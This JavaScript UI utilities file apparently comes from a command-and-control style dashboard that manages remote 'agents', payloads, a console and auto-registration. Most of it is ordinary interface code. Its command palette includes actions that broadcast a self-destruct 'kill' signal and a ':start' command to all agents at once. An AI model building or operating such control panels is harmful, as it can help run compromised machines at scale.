/**
 * ui.js — Enhanced UI utilities v3.0
 * Notifications, command palette, keyboard shortcuts, animations, tooltips
 */

/* ──────────────────────── NOTIFICATIONS ──────────────────────── */
let _notifStack = 0;
let _notifQueue = [];

function showNotification(msg, type = 'accent', duration = 4500) {
  const themes = {
    accent: { bg: 'rgba(108,92,231,.1)',   border: 'rgba(108,92,231,.35)',  color: '#6c5ce7', icon: '⚡' },
    green:  { bg: 'rgba(0,245,155,.1)',   border: 'rgba(0,245,155,.35)', color: '#00f59b', icon: '✓' },
    red:    { bg: 'rgba(255,61,90,.1)',   border: 'rgba(255,61,90,.35)', color: '#ff3d5a', icon: '✕' },
    yellow: { bg: 'rgba(255,210,0,.1)',   border: 'rgba(255,210,0,.35)', color: '#ffd200', icon: '⚠' },
    purple: { bg: 'rgba(176,125,250,.1)', border: 'rgba(176,125,250,.35)', color: '#b07dfa', icon: '◈' },
  };
  const t = themes[type] || themes.accent;
  const n = document.createElement('div');
  const slot = _notifStack;
  const offset = 20 + slot * 66;

  Object.assign(n.style, {
    position:      'fixed',
    top:           offset + 'px',
    right:         '20px',
    background:    t.bg,
    border:        `1px solid ${t.border}`,
    borderRadius:  '12px',
    padding:       '11px 16px 11px 14px',
    fontSize:      '13px',
    fontWeight:    '500',
    zIndex:        '9999',
    backdropFilter:'blur(20px)',
    boxShadow:     `0 8px 32px rgba(0,0,0,.45), 0 0 0 1px rgba(255,255,255,.04)`,
    fontFamily:    'Inter, sans-serif',
    maxWidth:      '360px',
    minWidth:      '220px',
    cursor:        'pointer',
    userSelect:    'none',
    transition:    'all .3s cubic-bezier(.4,0,.2,1)',
    opacity:       '0',
    transform:     'translateX(20px)',
    display:       'flex',
    alignItems:    'center',
    gap:           '10px',
  });

  const icon = document.createElement('span');
  icon.style.cssText = `font-size:14px;color:${t.color};flex-shrink:0;`;
  icon.textContent = t.icon;

  const text = document.createElement('span');
  text.style.cssText = `color:${t.color};flex:1;word-break:break-word;line-height:1.4;`;
  text.textContent = msg;

  const close = document.createElement('span');
  close.style.cssText = `color:${t.color};opacity:0.5;font-size:16px;flex-shrink:0;line-height:1;`;
  close.textContent = '×';

  n.appendChild(icon);
  n.appendChild(text);
  n.appendChild(close);

  const dismiss = () => {
    n.style.opacity = '0';
    n.style.transform = 'translateX(20px)';
    n.style.maxHeight = '0';
    n.style.padding = '0';
    n.style.marginBottom = '0';
    _notifStack = Math.max(0, _notifStack - 1);
    setTimeout(() => n.remove(), 320);
  };

  n.addEventListener('click', dismiss);
  document.body.appendChild(n);
  _notifStack++;

  requestAnimationFrame(() => {
    n.style.opacity = '1';
    n.style.transform = 'translateX(0)';
  });

  setTimeout(dismiss, duration);
}

/* ──────────────────────── KEYBOARD SHORTCUTS ──────────────────────── */
document.addEventListener('keydown', e => {
  if (e.key === 'Escape') {
    document.querySelectorAll('.modal-overlay.active').forEach(m => m.classList.remove('active'));
    const cp = document.getElementById('cmdPalette');
    if (cp && cp.style.display !== 'none') {
      cp.style.opacity = '0';
      setTimeout(() => cp.style.display = 'none', 200);
    }
  }
  if (e.ctrlKey && e.key === 'k') {
    e.preventDefault();
    toggleCommandPalette();
  }
  // Quick nav shortcuts
  if (!e.ctrlKey && !e.altKey && !e.shiftKey && !['INPUT','TEXTAREA','SELECT'].includes(document.activeElement?.tagName)) {
    const shortcuts = { '1': '/', '2': '/devices', '3': '/console', '4': '/payloads', '5': '/scheduler' };
    if (shortcuts[e.key]) { e.preventDefault(); location.href = shortcuts[e.key]; }
  }
});

/* ──────────────────────── COMMAND PALETTE ──────────────────────── */
const PALETTE_COMMANDS = [
  { label: 'Dashboard',       icon: '⬛', url: '/',            hint: '1' },
  { label: 'Devices',         icon: '💻', url: '/devices',     hint: '2' },
  { label: 'Console',         icon: '⌨️',  url: '/console',     hint: '3' },
  { label: 'Payloads',        icon: '📦', url: '/payloads',    hint: '4' },
  { label: 'Scheduler',       icon: '⏱',  url: '/scheduler',   hint: '5' },
  { label: 'Auto-Reg',        icon: '👤', url: '/autoreg' },
  { label: 'Laboratory',      icon: '🔬', url: '/laboratory' },
  { label: 'Temp Mail',       icon: '✉️',  url: '/tempmail' },
  { label: 'Logs',            icon: '📋', url: '/logs' },
  { label: 'Settings',        icon: '⚙️',  url: '/settings' },
  { label: 'Export Agents',   icon: '📁', url: '/api/export/agents',  download: true },
  { label: 'Export Logs',     icon: '📁', url: '/api/export/logs',    download: true },
  {
    label: 'Kill All Agents', icon: '💀',
    action: () => {
      if (!confirm('KILL ALL AGENTS? This cannot be undone.')) return;
      fetch('/api/task/broadcast', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type: 'kill', payload: 'self-destruct', target: 'all' }),
      }).then(() => showNotification('Kill signal sent to all agents', 'red'));
    },
  },
  {
    label: 'Broadcast :start', icon: '🚀',
    action: () => {
      fetch('/api/task/broadcast', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type: 'cmd', payload: ':start', target: 'all' }),
      }).then(r => r.json()).then(d => showNotification(`Dispatched to ${d.count} agents`, 'green'));
    },
  },
  { label: 'Refresh Page', icon: '🔄', action: () => location.reload() },
  { label: 'Logout',       icon: '🚪', url: '/logout' },
];

let _cpIdx = 0;

function _cpHighlight(items) {
  items.forEach((el, i) => {
    const active = i === _cpIdx;
    el.style.background  = active ? 'rgba(108,92,231,0.08)' : '';
    el.style.color       = active ? 'var(--accent)'        : 'var(--text)';
    el.style.borderLeft  = active ? '2px solid var(--accent)' : '2px solid transparent';
    if (active) el.scrollIntoView({ block: 'nearest' });
  });
}

function toggleCommandPalette() {
  let cp = document.getElementById('cmdPalette');
  if (!cp) {
    cp = document.createElement('div');
    cp.id = 'cmdPalette';
    cp.style.cssText = 'display:none;position:fixed;inset:0;background:rgba(0,0,0,.75);z-index:10000;backdrop-filter:blur(10px);align-items:flex-start;justify-content:center;padding-top:15vh;transition:opacity .2s ease';

    cp.innerHTML = `
      <div style="background:var(--bg-card);border:1px solid var(--border-light);border-radius:16px;width:560px;max-width:94vw;box-shadow:0 24px 80px rgba(0,0,0,.7),0 0 0 1px rgba(255,255,255,.05);overflow:hidden;animation:modalIn .22s cubic-bezier(.4,0,.2,1)">
        <div style="position:relative;padding:4px 16px 4px 50px;border-bottom:1px solid var(--border)">
          <svg style="position:absolute;left:17px;top:50%;transform:translateY(-50%);opacity:.4" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/>
          </svg>
          <input id="cpInput" type="text" placeholder="Search commands or navigate…"
            style="width:100%;background:transparent;border:none;padding:15px 0;font-size:14px;color:var(--text-bright);font-family:var(--font-mono);outline:none;letter-spacing:.3px">
        </div>
        <div id="cpResults" style="max-height:340px;overflow-y:auto;padding:6px 0"></div>
        <div style="padding:9px 16px;border-top:1px solid var(--border);display:flex;gap:18px;font-size:10px;color:var(--text-muted);font-family:var(--font-mono);align-items:center">
          <span style="display:flex;align-items:center;gap:5px"><kbd style="background:var(--bg-input);padding:2px 6px;border-radius:3px;border:1px solid var(--border);border-bottom-width:2px">↑↓</kbd> navigate</span>
          <span style="display:flex;align-items:center;gap:5px"><kbd style="background:var(--bg-input);padding:2px 6px;border-radius:3px;border:1px solid var(--border);border-bottom-width:2px">↵</kbd> select</span>
          <span style="display:flex;align-items:center;gap:5px"><kbd style="background:var(--bg-input);padding:2px 6px;border-radius:3px;border:1px solid var(--border);border-bottom-width:2px">Esc</kbd> close</span>
          <span style="margin-left:auto;color:var(--text-muted);font-size:9px">Ctrl+K</span>
        </div>
      </div>`;

    cp.addEventListener('click', e => {
      if (e.target === cp) {
        cp.style.opacity = '0';
        setTimeout(() => { cp.style.display = 'none'; cp.style.opacity = ''; }, 200);
      }
    });
    document.body.appendChild(cp);

    const input = cp.querySelector('#cpInput');
    input.addEventListener('input', () => { _cpIdx = 0; _renderPalette(input.value); });
    input.addEventListener('keydown', e => {
      const items = cp.querySelectorAll('.cp-item');
      if      (e.key === 'ArrowDown') { e.preventDefault(); _cpIdx = Math.min(_cpIdx + 1, items.length - 1); _cpHighlight(items); }
      else if (e.key === 'ArrowUp')   { e.preventDefault(); _cpIdx = Math.max(_cpIdx - 1, 0); _cpHighlight(items); }
      else if (e.key === 'Enter')     { e.preventDefault(); if (items[_cpIdx]) items[_cpIdx].click(); }
    });
  }

  if (cp.style.display !== 'flex') {
    cp.style.display = 'flex';
    cp.style.opacity = '0';
    requestAnimationFrame(() => { cp.style.opacity = '1'; });
    const input = cp.querySelector('#cpInput');
    input.value = '';
    input.focus();
    _renderPalette('');
  } else {
    cp.style.opacity = '0';
    setTimeout(() => { cp.style.display = 'none'; cp.style.opacity = ''; }, 200);
  }
}

function _runCommand(cmd) {
  const cp = document.getElementById('cmdPalette');
  if (cp) { cp.style.opacity = '0'; setTimeout(() => { cp.style.display = 'none'; cp.style.opacity = ''; }, 200); }
  if (cmd.action) { cmd.action(); return; }
  if (cmd.download) { window.location.href = cmd.url; return; }
  location.href = cmd.url;
}

function _renderPalette(query) {
  const container = document.getElementById('cpResults');
  const q = query.toLowerCase().trim();
  const filtered = q
    ? PALETTE_COMMANDS.filter(c => c.label.toLowerCase().includes(q))
    : PALETTE_COMMANDS;

  container.innerHTML = filtered.length
    ? filtered.map((cmd, i) => `
      <div class="cp-item" style="padding:9px 16px 9px 20px;cursor:pointer;display:flex;align-items:center;gap:12px;transition:all .12s;font-size:13.5px;color:var(--text);border-left:2px solid transparent;user-select:none"
        onmouseenter="this.style.background='rgba(108,92,231,.06)';this.style.color='var(--accent)';this.style.borderLeft='2px solid var(--accent)'"
        onmouseleave="this.style.background='';this.style.color='var(--text)';this.style.borderLeft='2px solid transparent'"
        onclick="_runCmdByIndex(${i}, ${JSON.stringify(q)})">
        <span style="font-size:16px;min-width:24px;text-align:center">${cmd.icon}</span>
        <span style="font-weight:500;flex:1">${cmd.label}</span>
        ${cmd.hint ? `<span style="font-size:9px;color:var(--text-muted);background:var(--bg-input);border:1px solid var(--border);padding:1px 5px;border-radius:3px;font-family:var(--font-mono)">${cmd.hint}</span>` : ''}
        ${cmd.url ? `<span style="font-size:10px;color:var(--text-muted);font-family:var(--font-mono);opacity:.6">${cmd.url}</span>` : ''}
      </div>`).join('')
    : '<div style="padding:24px;text-align:center;color:var(--text-muted);font-size:12px">No commands found</div>';

  setTimeout(() => _cpHighlight(container.querySelectorAll('.cp-item')), 0);
}

function _runCmdByIndex(idx, query) {
  const q = query.toLowerCase().trim();
  const filtered = q
    ? PALETTE_COMMANDS.filter(c => c.label.toLowerCase().includes(q))
    : PALETTE_COMMANDS;
  if (filtered[idx]) _runCommand(filtered[idx]);
}

/* ──────────────────────── ANIMATED COUNTER ──────────────────────── */
function animateCount(el, from, to, duration = 700) {
  if (!el || from === to) return;
  const start = performance.now();
  const update = now => {
    const p = Math.min((now - start) / duration, 1);
    const ease = 1 - Math.pow(1 - p, 3);
    el.textContent = Math.round(from + (to - from) * ease);
    if (p < 1) requestAnimationFrame(update);
    else { el.textContent = to; el.classList.add('count-anim'); setTimeout(() => el.classList.remove('count-anim'), 400); }
  };
  requestAnimationFrame(update);
}

function flashRow(rowEl) {
  if (!rowEl) return;
  rowEl.classList.remove('row-updated');
  void rowEl.offsetWidth;
  rowEl.classList.add('row-updated');
  setTimeout(() => rowEl.classList.remove('row-updated'), 1200);
}

/* ──────────────────────── MODAL HELPERS ──────────────────────── */
function openModal(id) {
  const m = document.getElementById(id);
  if (m) {
    m.classList.add('active');
    m.querySelector('input, select, textarea')?.focus();
  }
}
function closeModal(id) {
  const m = document.getElementById(id);
  if (m) m.classList.remove('active');
}
document.addEventListener('click', e => {
  if (e.target.classList.contains('modal-overlay')) {
    e.target.classList.remove('active');
  }
});

/* ──────────────────────── CONFIRM DIALOG ──────────────────────── */
function confirmAction(msg, onConfirm) {
  const d = document.createElement('div');
  d.className = 'modal-overlay active';
  d.innerHTML = `
    <div class="modal" style="min-width:360px;max-width:480px;text-align:center">
      <div style="font-size:28px;margin-bottom:12px">⚠️</div>
      <p style="font-size:14px;color:var(--text);margin-bottom:6px;font-weight:600">${msg}</p>
      <p style="font-size:12px;color:var(--text-dim);margin-bottom:24px">This action cannot be undone.</p>
      <div style="display:flex;gap:10px;justify-content:center">
        <button class="btn" onclick="this.closest('.modal-overlay').remove()">Cancel</button>
        <button class="btn danger" id="cfmBtn">Confirm</button>
      </div>
    </div>`;
  d.querySelector('#cfmBtn').addEventListener('click', () => {
    d.remove();
    onConfirm();
  });
  document.body.appendChild(d);
}

/* ──────────────────────── TABLE SEARCH ──────────────────────── */
function filterTable(inputEl, tableId) {
  const q = inputEl.value.toLowerCase();
  const rows = document.querySelectorAll(`#${tableId} tbody tr`);
  let shown = 0;
  rows.forEach(row => {
    const match = row.textContent.toLowerCase().includes(q);
    row.style.display = match ? '' : 'none';
    if (match) shown++;
  });
  const counter = document.getElementById(tableId + '-count');
  if (counter) counter.textContent = shown;
}

/* ──────────────────────── COPY TO CLIPBOARD ──────────────────────── */
function copyText(text, btn) {
  navigator.clipboard.writeText(text).then(() => {
    if (btn) {
      const orig = btn.textContent;
      btn.textContent = '✓ Copied!';
      btn.style.color = 'var(--green)';
      setTimeout(() => {
        btn.textContent = orig;
        btn.style.color = '';
      }, 2000);
    } else {
      showNotification('Copied to clipboard', 'green', 2000);
    }
  }).catch(() => showNotification('Copy failed', 'red', 2000));
}

/* ──────────────────────── RIPPLE EFFECT ──────────────────────── */
document.addEventListener('click', e => {
  const btn = e.target.closest('.btn');
  if (!btn) return;
  const r = document.createElement('span');
  const rect = btn.getBoundingClientRect();
  const size = Math.max(rect.width, rect.height);
  r.style.cssText = `
    position:absolute;width:${size}px;height:${size}px;
    left:${e.clientX-rect.left-size/2}px;
    top:${e.clientY-rect.top-size/2}px;
    background:rgba(255,255,255,0.1);
    border-radius:50%;
    transform:scale(0);
    animation:ripple .5s ease-out;
    pointer-events:none;
  `;
  if (!getComputedStyle(btn).position || getComputedStyle(btn).position === 'static') {
    btn.style.position = 'relative';
  }
  btn.style.overflow = 'hidden';
  btn.appendChild(r);
  setTimeout(() => r.remove(), 500);
});

/* ──────────────────────── LAZY COUNT ANIMATION ON PAGE LOAD ──────────────────────── */
window.addEventListener('DOMContentLoaded', () => {
  document.querySelectorAll('.stat-card .value').forEach(el => {
    const val = parseInt(el.textContent);
    if (!isNaN(val) && val > 0) {
      el.textContent = '0';
      setTimeout(() => animateCount(el, 0, val, 800), 300);
    }
  });
});
